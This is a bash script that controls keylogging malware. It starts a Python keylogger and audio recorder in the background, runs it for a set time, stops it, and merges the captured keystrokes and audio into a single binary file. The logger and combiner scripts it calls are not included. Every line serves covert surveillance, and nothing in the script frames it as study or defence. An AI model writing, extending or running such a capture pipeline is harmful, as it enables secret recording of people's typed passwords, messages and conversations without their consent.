#!/bin/bash

# Define script names and output files
KEYLOGGER_AUDIO_SCRIPT="logger.py"
CONSOLIDATE_SCRIPT="combiner.py"
COMBINED_OUTPUT="combined_output.bin"

# Run the keylogger and audio recording script in the background
echo "Starting keylogger and audio recorder..."
python3 "$KEYLOGGER_AUDIO_SCRIPT" &
KEYLOGGER_PID=$!
echo "Keylogger and audio recorder running with PID $KEYLOGGER_PID"

# Define the duration to run the keylogger and audio recorder (in seconds)
RUN_DURATION=60  # Adjust as needed

# Wait for the specified duration
echo "Running for $RUN_DURATION seconds..."
sleep $RUN_DURATION

# Stop the keylogger and audio recording script
echo "Stopping keylogger and audio recorder..."
kill $KEYLOGGER_PID
wait $KEYLOGGER_PID 2>/dev/null

# Run the script to consolidate keystrokes and audio files into one file
echo "Consolidating keystrokes and audio into $COMBINED_OUTPUT..."
python3 "$CONSOLIDATE_SCRIPT"

echo "All processes completed. Combined file created as $COMBINED_OUTPUT."
